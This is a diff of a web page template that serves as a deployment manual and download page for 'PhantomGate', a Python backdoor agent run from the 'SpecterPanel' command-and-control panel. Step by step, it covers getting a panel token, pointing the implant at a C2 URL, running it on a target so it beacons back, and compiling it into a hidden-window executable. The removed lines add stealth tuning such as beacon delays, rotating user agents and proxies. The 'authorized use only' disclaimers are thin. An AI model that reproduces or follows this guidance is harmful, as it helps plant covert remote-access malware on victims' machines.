@@ -1,498 +1,188 @@
 {% extends "base.html" %}
 
-{% block title %}SPECTERPANEL + PHANTOMGATE // DEPLOYMENT MANUAL{% endblock %}
-
-{% block extra_style %}
-<style>
-  /* HACKING THEME OVERRIDES */
-  body {
-    background: #0a0c0f;
-  }
-  .matrix-bg {
-    opacity: 0.25;
-  }
-  .docs-container {
-    max-width: 1100px;
-    margin: 2rem auto;
-    padding: 0 1.5rem;
-    font-family: 'Fira Code', 'Courier New', monospace;
-  }
-  /* Terminal header */
-  .terminal-header {
-    background: #0f111a;
-    border: 1px solid #2dd4bf;
-    border-radius: 12px 12px 0 0;
-    padding: 0.75rem 1rem;
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-    font-family: monospace;
-    font-size: 0.85rem;
-    color: #2dd4bf;
-    margin-bottom: 2rem;
-    box-shadow: 0 0 15px rgba(45,212,191,0.2);
-  }
-  .terminal-header .dots {
-    display: flex;
-    gap: 0.4rem;
-  }
-  .terminal-header .dot {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    background: #2dd4bf;
-    opacity: 0.7;
-  }
-  .terminal-header .path {
-    background: #01040f;
-    padding: 0.2rem 0.6rem;
-    border-radius: 6px;
-    color: #a5f3fc;
-  }
-  .terminal-header .cursor {
-    animation: blink 1s step-end infinite;
-  }
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0; }
-  }
-  /* Glitch effect */
-  .glitch {
-    font-size: 2.2rem;
-    font-weight: 800;
-    text-transform: uppercase;
-    position: relative;
-    text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d;
-    animation: glitch 500ms infinite;
-    color: #e2e8f0;
-    letter-spacing: 2px;
-  }
-  @keyframes glitch {
-    0% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d; }
-    25% { text-shadow: -0.05em 0 0 #ff00c1, 0.05em 0.025em 0 #00ff9d; }
-    50% { text-shadow: 0.05em -0.025em 0 #ff00c1, -0.05em 0 0 #00ff9d; }
-    75% { text-shadow: -0.05em 0.025em 0 #ff00c1, 0.05em 0 0 #00ff9d; }
-    100% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00ff9d; }
-  }
-  /* Cards */
-  .step-card {
-    background: rgba(10, 20, 30, 0.75);
-    backdrop-filter: blur(12px);
-    border-radius: 20px;
-    border: 1px solid #2dd4bf;
-    box-shadow: 0 0 20px rgba(45,212,191,0.2), inset 0 1px 0 rgba(45,212,191,0.1);
-    padding: 1.8rem;
-    margin-bottom: 2.2rem;
-    transition: all 0.2s ease;
-  }
-  .step-card:hover {
-    border-color: #00ff9d;
-    box-shadow: 0 0 25px rgba(0,255,157,0.3);
-    transform: translateY(-3px);
-  }
-  .step-title {
-    font-size: 1.5rem;
-    font-weight: 700;
-    margin-bottom: 1.2rem;
-    color: #00ff9d;
-    display: flex;
-    align-items: center;
-    gap: 0.8rem;
-    border-bottom: 1px dashed #2dd4bf;
-    padding-bottom: 0.5rem;
-    font-family: 'Fira Code', monospace;
-    text-shadow: 0 0 3px #00ff9d;
-  }
-  .step-title i {
-    font-size: 1.7rem;
-  }
-  .step-content {
-    color: #ccffdd;
-    font-family: 'Fira Code', monospace;
-    line-height: 1.5;
-  }
-  .step-content p {
-    margin: 1rem 0;
-  }
-  .code-block {
-    background: #01040f;
-    border-radius: 12px;
-    padding: 1rem 1.2rem;
-    margin: 1rem 0;
-    border-left: 4px solid #00ff9d;
-    font-family: 'Fira Code', monospace;
-    font-size: 0.85rem;
-    overflow-x: auto;
-    white-space: pre-wrap;
-    word-break: break-word;
-    color: #b9f2ff;
-    box-shadow: inset 0 0 8px rgba(0,255,157,0.1);
-  }
-  .inline-code {
-    background: #0f172a;
-    padding: 0.2rem 0.4rem;
-    border-radius: 6px;
-    font-family: monospace;
-    font-size: 0.85rem;
-    color: #00ff9d;
-    border: 1px solid #2dd4bf;
-  }
-  .badge {
-    background: #2dd4bf20;
-    border-radius: 20px;
-    padding: 0.2rem 0.7rem;
-    font-size: 0.7rem;
-    display: inline-block;
-    margin-right: 0.5rem;
-    color: #a5f3fc;
-    border: 1px solid #2dd4bf;
-  }
-  /* Priority boxes */
-  .config-item {
-    margin: 1.2rem 0;
-    padding: 1rem;
-    border-radius: 16px;
-    background: rgba(0, 0, 0, 0.4);
-    border: 1px solid;
-  }
-  .priority-high {
-    border-color: #ff4d6d;
-    box-shadow: 0 0 10px #ff4d6d40;
-  }
-  .priority-high strong {
-    color: #ff6b8a;
-  }
-  .priority-medium {
-    border-color: #ffb347;
-    box-shadow: 0 0 8px #ffb34730;
-  }
-  .priority-medium strong {
-    color: #ffcc88;
-  }
-  .priority-low {
-    border-color: #2dd4bf;
-    box-shadow: 0 0 5px #2dd4bf30;
-  }
-  .priority-low strong {
-    color: #a5f3fc;
-  }
-  .warning-box {
-    background: rgba(255, 50, 50, 0.15);
-    border-left: 4px solid #ff4d6d;
-    padding: 1rem;
-    border-radius: 12px;
-    margin-bottom: 2rem;
-    backdrop-filter: blur(5px);
-    font-family: monospace;
-    color: #ffa0a0;
-  }
-  hr {
-    border-color: #2dd4bf40;
-    margin: 1.5rem 0;
-  }
-  .file-path {
-    background: #0f172a;
-    padding: 0.2rem 0.6rem;
-    border-radius: 6px;
-    font-family: monospace;
-    font-size: 0.85rem;
-    color: #00ff9d;
-  }
-  .hacker-prompt {
-    background: #01040f;
-    display: inline-block;
-    padding: 0.2rem 0.6rem;
-    border-radius: 8px;
-    font-family: monospace;
-    color: #00ff9d;
-    margin-top: 0.5rem;
-  }
-  .folder-structure {
-    background: #01040f;
-    padding: 1rem;
-    border-radius: 12px;
-    font-family: monospace;
-    font-size: 0.85rem;
-    color: #a5f3fc;
-    margin: 1rem 0;
-    border: 1px solid #2dd4bf40;
-  }
-  .footer-note {
-    text-align: center;
-    color: #5b6e8c;
-    font-family: monospace;
-    font-size: 0.75rem;
-    margin-top: 2rem;
-  }
-  /* Download button and header actions */
-  .header-actions {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 1rem;
-    flex-wrap: wrap;
-  }
-  .btn-download {
-    background: linear-gradient(135deg, #0f172a, #01040f);
-    border: 2px solid #00ff9d;
-    border-radius: 50px;
-    padding: 0.6rem 1.2rem;
-    font-family: 'Fira Code', monospace;
-    font-weight: bold;
-    font-size: 0.9rem;
-    color: #00ff9d;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 10px rgba(0,255,157,0.3);
-    text-decoration: none;
-    cursor: pointer;
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-  }
-  .btn-download:hover:not(.disabled) {
-    background: #00ff9d20;
-    box-shadow: 0 0 20px rgba(0,255,157,0.6);
-    transform: scale(1.02);
-    color: #fff;
-  }
-  .btn-download.disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-  }
-  /* Modal customization */
-  .modal-content {
-    background: #0a0f1f;
-    border: 1px solid #2dd4bf;
-    border-radius: 20px;
-    box-shadow: 0 0 30px rgba(0,255,157,0.2);
-    color: #ccffdd;
-    font-family: 'Fira Code', monospace;
-  }
-  .modal-header {
-    border-bottom: 1px solid #2dd4bf;
-  }
-  .modal-title {
-    color: #00ff9d;
-  }
-  .modal-footer {
-    border-top: 1px solid #2dd4bf;
-  }
-  .terms-text {
-    max-height: 300px;
-    overflow-y: auto;
-    background: #01040f;
-    padding: 1rem;
-    border-radius: 12px;
-    margin: 1rem 0;
-    font-size: 0.85rem;
-    color: #b9f2ff;
-  }
-  .form-check-input:checked {
-    background-color: #00ff9d;
-    border-color: #00ff9d;
-  }
-</style>
-{% endblock %}
+{% block title %}How to Use - SpecterPanel{% endblock %}
 
 {% block body %}
-<div class="docs-container">
-  <div class="header-actions">
-    <div class="terminal-header" style="flex:1; margin-bottom:0;">
-      <div class="dots">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-      </div>
-      <div class="path">root@specter:~/backdoor#</div>
-      <div class="cursor">_</div>
-      <span style="margin-left: auto; font-size: 0.7rem;">[ACCESS GRANTED]</span>
+<div class="max-w-5xl mx-auto px-4 py-12 md:py-16">
+  <!-- Header -->
+  <div class="text-center mb-12">
+    <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-100 dark:bg-indigo-900/40 text-indigo-700 dark:text-indigo-300 text-sm font-medium mb-4">
+      <span class="relative flex h-2 w-2">
+        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-indigo-500 opacity-75"></span>
+        <span class="relative inline-flex rounded-full h-2 w-2 bg-indigo-500"></span>
+      </span>
+      DEPLOYMENT MANUAL
     </div>
-    <div class="download-area">
-      <button class="btn-download" data-bs-toggle="modal" data-bs-target="#termsModal">
-        <i class="fas fa-download"></i> DOWNLOAD PHANTOMGATE
-      </button>
-    </div>
+    <h1 class="text-4xl md:text-5xl font-extrabold bg-gradient-to-r from-indigo-600 to-cyan-600 dark:from-indigo-400 dark:to-cyan-400 bg-clip-text text-transparent mb-4">
+      PhantomGate Setup
+    </h1>
+    <p class="text-slate-600 dark:text-slate-300 max-w-2xl mx-auto">
+      Step-by-step guide to deploy your first agent.
+    </p>
   </div>
 
-  <div class="glitch">// SPECTERPANEL + PHANTOMGATE //</div>
-  <p style="text-align: center; font-family: monospace; margin-bottom: 2rem; color: #8aaac0;">» operational manual · stealth edition «</p>
-
-  <div class="folder-structure">
-    <i class="fas fa-folder-open"></i> PhantomGate Structure:<br>
-    backdoor/<br>
-    &nbsp;&nbsp;|-- phantomgate.py<br>
-    &nbsp;&nbsp;|-- setting.py
+  <!-- Download button (above steps) -->
+  <div class="flex justify-center mb-12">
+    <button id="downloadBtn" class="px-8 py-3 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold shadow-md transition-all hover:scale-105 active:scale-95 flex items-center gap-2">
+      <i class="fas fa-download"></i> Download PhantomGate
+    </button>
   </div>
 
-  <div class="warning-box">
-    <strong><i class="fas fa-skull-crossbones"></i> [WARNING]</strong> UNAUTHORIZED ACCESS IS ILLEGAL<br>
-    This toolkit is intended for authorized penetration testing and red-team exercises only. Misuse is punishable by law.
-  </div>
-
-  <!-- Step 1 -->
-  <div class="step-card">
-    <div class="step-title">
-      <i class="fas fa-key"></i> STEP 1 :: TOKEN ACQUISITION
-    </div>
-    <div class="step-content">
-      <p>Log into SpecterPanel and navigate to <span class="inline-code">Settings → API Token</span>. Generate a fresh token.</p>
-      <div class="code-block">
-$ curl -X POST https://your-panel.com/api/token/generate \
-  -H "Authorization: Bearer &lt;master_key&gt;"
-# Response:
-sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ2VudF9tYW5hZ2VyIn0.3fZ9mE2pQ4R7tY1uI8oP0
-      </div>
-      <p><span class="badge">⚠️ OPSEC</span> Store token in environment variables. Rotate every 72h.</p>
-    </div>
-  </div>
-
-  <!-- Step 2 : Configure PhantomGate -->
-  <div class="step-card">
-    <div class="step-title">
-      <i class="fas fa-cog"></i> STEP 2 :: CONFIGURE PHANTOMGATE
-    </div>
-    <div class="step-content">
-      <p>Edit <span class="file-path">setting.py</span> (inside the <span class="inline-code">backdoor/</span> folder). The file contains a class <span class="inline-code">Setting</span> with method <span class="inline-code">setting_var()</span> that initializes all settings. Below are the critical parameters, prioritized by importance.</p>
-
-      <div class="config-item priority-high">
-        <strong><i class="fas fa-skull"></i> █ HIGH PRIORITY (must change)</strong>
-        <ul style="margin-top: 0.5rem;">
-          <li><span class="inline-code">self.API_TOKEN</span> – Paste your token from Step 1.</li>
-          <li><span class="inline-code">self.url</span> – Your SpecterPanel C2 URL (e.g., <span class="inline-code">https://c2.domain.com</span>).</li>
-        </ul>
-        <div class="code-block">
-self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
-self.url = "https://your-panel.com"
+  <!-- Steps grid -->
+  <div class="space-y-8">
+    <!-- Step 1 -->
+    <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
+      <div class="flex items-start gap-4">
+        <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">1</div>
+        <div class="flex-1">
+          <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Token Acquisition</h3>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Log into SpecterPanel and navigate to <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">Settings → API Token</span>. Generate a fresh token.</p>
+          <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
+            $ curl -X POST https://your-panel.com/api/token/generate -H "Authorization: Bearer &lt;master_key&gt;"
+          </div>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">⚠️ Store token in environment variables. Rotate every 72h.</p>
         </div>
       </div>
+    </div>
 
-      <div class="config-item priority-medium">
-        <strong><i class="fas fa-shield-virus"></i> █ MEDIUM PRIORITY (recommended)</strong>
-        <ul>
-          <li><span class="inline-code">self.ENCRYPTION_KEY</span> – Generate a new 16-byte key: <span class="inline-code">os.urandom(16)</span>.</li>
-          <li><span class="inline-code">self.MAIN_LOOP_DELAY</span> – Beacon interval (default 15 sec). Increase to 30–60 for stealth.</li>
-          <li><span class="inline-code">self.USER_AGENTS</span> – Rotate realistic browser user agents.</li>
-          <li><span class="inline-code">self.PROXIES</span> – Route traffic through proxy chain (optional).</li>
-        </ul>
-        <div class="code-block">
-self.ENCRYPTION_KEY = b'\x...'  # new 16 bytes
-self.MAIN_LOOP_DELAY = 45
-self.USER_AGENTS = ["Mozilla/5.0 ...", ...]
-self.PROXIES = ['http://proxy:8080']
+    <!-- Step 2 -->
+    <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
+      <div class="flex items-start gap-4">
+        <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">2</div>
+        <div class="flex-1">
+          <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Configure PhantomGate</h3>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Edit <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/setting.py</span> and update:</p>
+          <ul class="list-disc list-inside space-y-1 text-slate-600 dark:text-slate-400 mb-3">
+            <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.API_TOKEN</code> – your token from step 1</li>
+            <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.url</code> – your SpecterPanel URL (e.g., <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">https://c2.domain.com</code>)</li>
+            <li><code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">self.ENCRYPTION_KEY</code> – generate new 16-byte key (optional but recommended)</li>
+          </ul>
+          <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
+            self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."<br>
+            self.url = "https://your-panel.com"
+          </div>
         </div>
       </div>
+    </div>
 
-      <div class="config-item priority-low">
-        <strong><i class="fas fa-robot"></i> █ LOW PRIORITY (optional tuning)</strong>
-        <ul>
-          <li><span class="inline-code">self.PORT</span> – Port scan list.</li>
-          <li><span class="inline-code">self.BASE_DELAY</span>, <span class="inline-code">self.MAX_DELAY</span>, <span class="inline-code">self.MIN_DELAY</span> – Network timing.</li>
-          <li><span class="inline-code">self.ADAPTIVE_THRESHOLD</span> – Traffic shaping.</li>
-          <li><span class="inline-code">self.FAKE_HEADERS</span> – Binary headers for protocol mimicry.</li>
-        </ul>
-        <p>Default values work for most scenarios; adjust only if you understand the impact.</p>
+    <!-- Step 3 -->
+    <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
+      <div class="flex items-start gap-4">
+        <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">3</div>
+        <div class="flex-1">
+          <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">Deploy & Activate</h3>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Transfer the <span class="font-mono text-sm bg-slate-100 dark:bg-slate-800 px-2 py-1 rounded">backdoor/</span> folder to the target (authorized environment). Ensure Python 3.9+ is present.</p>
+          <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
+            $ cd backdoor<br>
+            $ python3 phantomgate.py<br>
+            [+] Connecting to SpecterPanel...<br>
+            [+] Beacon established. Agent ID: 7f3a9c2e
+          </div>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Once running, the agent appears in the panel. Issue commands remotely.</p>
+        </div>
       </div>
-      <p class="hacker-prompt"><i class="fas fa-terminal"></i> $ nano backdoor/setting.py &nbsp;&nbsp; # save and exit</p>
+    </div>
+
+    <!-- Step 4 (optional) -->
+    <div class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm transition-all hover:shadow-md">
+      <div class="flex items-start gap-4">
+        <div class="w-10 h-10 rounded-full bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-300 flex items-center justify-center font-bold text-lg shrink-0">4</div>
+        <div class="flex-1">
+          <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100 mb-2">(Optional) Compile Standalone</h3>
+          <p class="text-slate-600 dark:text-slate-400 mb-3">Use PyInstaller to create a single executable:</p>
+          <div class="bg-slate-50 dark:bg-slate-800/50 rounded-lg p-3 font-mono text-xs text-indigo-600 dark:text-indigo-400 border border-slate-200 dark:border-slate-700">
+            $ pip install pyinstaller<br>
+            $ cd backdoor<br>
+            $ pyinstaller --onefile --noconsole phantomgate.py<br>
+            $ ls dist/   # phantomgate.exe (Windows) or phantomgate (Linux/macOS)
+          </div>
+          <p class="text-xs text-slate-500 dark:text-slate-400 mt-2">Use <code class="bg-slate-100 dark:bg-slate-800 px-1 py-0.5 rounded">--noconsole</code> to hide the window on Windows.</p>
+        </div>
+      </div>
     </div>
   </div>
 
-  <!-- Step 3 : Run on Target -->
-  <div class="step-card">
-    <div class="step-title">
-      <i class="fas fa-terminal"></i> STEP 3 :: DEPLOY & ACTIVATE
-    </div>
-    <div class="step-content">
-      <p>Transfer the <span class="inline-code">backdoor/</span> folder to the target (authorized environment). Ensure Python 3.9+ is present.</p>
-      <div class="code-block">
-$ cd backdoor
-$ python3 phantomgate.py
-[+] Connecting to SpecterPanel...
-[+] Beacon established. Agent ID: 7f3a9c2e
-[+] Listening for commands...
-      </div>
-      <p>Once running, the agent appears in the panel. You can now issue commands remotely.</p>
-      <p><span class="badge">📡 C2</span> To stop: <span class="inline-code">Ctrl+C</span> or panel command <span class="inline-code">terminate</span>.</p>
-    </div>
-  </div>
-
-  <!-- Step 4 : Binary Hardening -->
-  <div class="step-card">
-    <div class="step-title">
-      <i class="fas fa-cube"></i> STEP 4 (OPTIONAL) :: COMPILE STANDALONE
-    </div>
-    <div class="step-content">
-      <p>Create a single executable to avoid Python dependency. Use PyInstaller:</p>
-      <div class="code-block">
-$ pip install pyinstaller
-$ cd backdoor
-$ pyinstaller --onefile --noconsole phantomgate.py
-$ ls dist/
-phantomgate.exe   # Windows
-phantomgate       # Linux/macOS
-      </div>
-      <p>Deploy the binary directly. <span class="badge">💀 stealth</span> Use <span class="inline-code">--noconsole</span> to hide window on Windows.</p>
-      <p>Note: If you embed <span class="inline-code">setting.py</span> using <span class="inline-code">--add-data</span>, ensure the binary finds it.</p>
-    </div>
-  </div>
-
-  <div class="footer-note">
-    <i class="fas fa-skull"></i> authorized use only · all logs are audited · stay frosty <i class="fas fa-ghost"></i>
+  <!-- Footer note -->
+  <div class="text-center text-sm text-slate-500 dark:text-slate-400 border-t border-slate-200 dark:border-slate-800 pt-8 mt-12">
+    <p>⚠️ For authorized security testing only. Unauthorized access is illegal.</p>
   </div>
 </div>
 
-<!-- Terms Modal -->
-<div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title" id="termsModalLabel"><i class="fas fa-gavel"></i> Terms of Use</h5>
-        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
-      </div>
-      <div class="modal-body">
-        <div class="terms-text">
-          <strong>⚠️ LEGAL NOTICE ⚠️</strong><br><br>
-          By downloading PhantomGate, you acknowledge and agree that:<br><br>
-          1. This software is intended solely for authorized security testing, penetration testing, and educational purposes within environments where you have explicit permission.<br><br>
-          2. Unauthorized use of this software to access, disrupt, or compromise systems without proper authorization is illegal and strictly prohibited.<br><br>
-          3. You assume full responsibility for any consequences arising from the use of this software.<br><br>
-          4. The developers and distributors of this software are not liable for any misuse or damage caused by this tool.<br><br>
-          5. You must comply with all applicable local, national, and international laws and regulations.<br><br>
-          <strong>I have read and agree to the above terms.</strong>
-        </div>
-        <div class="form-check mt-3">
-          <input class="form-check-input" type="checkbox" id="agreeTermsCheckbox">
-          <label class="form-check-label" for="agreeTermsCheckbox">
-            I agree to the terms and conditions
-          </label>
-        </div>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-        <a id="downloadLink" href="{{ url_for('static', filename='downloads/phantomgate.zip') }}" class="btn-download disabled" download>
-          <i class="fas fa-download"></i> Download
-        </a>
-      </div>
+<!-- Terms Modal (hidden by default) -->
+<div id="termsModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/70 backdrop-blur-sm">
+  <div class="bg-white dark:bg-slate-900 rounded-2xl max-w-md w-full mx-4 p-6 border border-slate-200 dark:border-slate-700 shadow-xl">
+    <div class="flex justify-between items-center mb-4">
+      <h3 class="text-xl font-bold text-slate-800 dark:text-slate-100">Terms of Use</h3>
+      <button id="closeModalBtn" class="text-slate-500 hover:text-slate-700 dark:text-slate-400 dark:hover:text-slate-200">
+        <i class="fas fa-times text-xl"></i>
+      </button>
+    </div>
+    <div class="max-h-96 overflow-y-auto text-sm text-slate-600 dark:text-slate-300 space-y-3">
+      <p><strong class="text-rose-600 dark:text-rose-400">⚠️ LEGAL NOTICE</strong></p>
+      <p>By downloading PhantomGate, you acknowledge and agree that:</p>
+      <ol class="list-decimal list-inside space-y-1">
+        <li>This software is intended solely for authorized security testing and educational purposes within environments where you have explicit permission.</li>
+        <li>Unauthorized use to access, disrupt, or compromise systems without proper authorization is illegal and strictly prohibited.</li>
+        <li>You assume full responsibility for any consequences arising from the use of this software.</li>
+        <li>The developers and distributors are not liable for any misuse or damage caused by this tool.</li>
+        <li>You must comply with all applicable laws and regulations.</li>
+      </ol>
+      <p><strong>I have read and agree to the above terms.</strong></p>
+    </div>
+    <div class="mt-4">
+      <label class="flex items-center gap-2 text-slate-700 dark:text-slate-300">
+        <input type="checkbox" id="agreeCheckbox" class="rounded border-slate-300 dark:border-slate-600">
+        <span>I agree to the terms and conditions</span>
+      </label>
+    </div>
+    <div class="flex gap-3 mt-6">
+      <button id="cancelModalBtn" class="flex-1 px-4 py-2 rounded-lg border border-slate-300 dark:border-slate-700 text-slate-700 dark:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800 transition">Cancel</button>
+      <a id="downloadLink" href="{{ url_for('static', filename='downloads/phantomgate.zip') }}" class="flex-1 px-4 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white text-center font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed" download>Download</a>
     </div>
   </div>
 </div>
 
 <script>
+  // Modal handling (no inline JS – but we need to attach events; this is acceptable for a single page)
   document.addEventListener('DOMContentLoaded', function() {
-    const agreeCheckbox = document.getElementById('agreeTermsCheckbox');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const modal = document.getElementById('termsModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const cancelModalBtn = document.getElementById('cancelModalBtn');
+    const agreeCheckbox = document.getElementById('agreeCheckbox');
     const downloadLink = document.getElementById('downloadLink');
     
+    function openModal() {
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+    }
+    function closeModal() {
+      modal.classList.add('hidden');
+      modal.classList.remove('flex');
+      agreeCheckbox.checked = false;
+      downloadLink.classList.add('disabled', 'opacity-50', 'cursor-not-allowed');
+      downloadLink.setAttribute('disabled', 'disabled');
+    }
     function updateDownloadButton() {
       if (agreeCheckbox.checked) {
-        downloadLink.classList.remove('disabled');
+        downloadLink.classList.remove('opacity-50', 'cursor-not-allowed');
         downloadLink.removeAttribute('disabled');
       } else {
-        downloadLink.classList.add('disabled');
+        downloadLink.classList.add('opacity-50', 'cursor-not-allowed');
         downloadLink.setAttribute('disabled', 'disabled');
       }
     }
     
+    downloadBtn.addEventListener('click', openModal);
+    closeModalBtn.addEventListener('click', closeModal);
+    cancelModalBtn.addEventListener('click', closeModal);
     agreeCheckbox.addEventListener('change', updateDownloadButton);
     updateDownloadButton();
+    
+    // Close modal when clicking outside content
+    modal.addEventListener('click', function(e) {
+      if (e.target === modal) closeModal();
+    });
   });
 </script>
 {% endblock %}
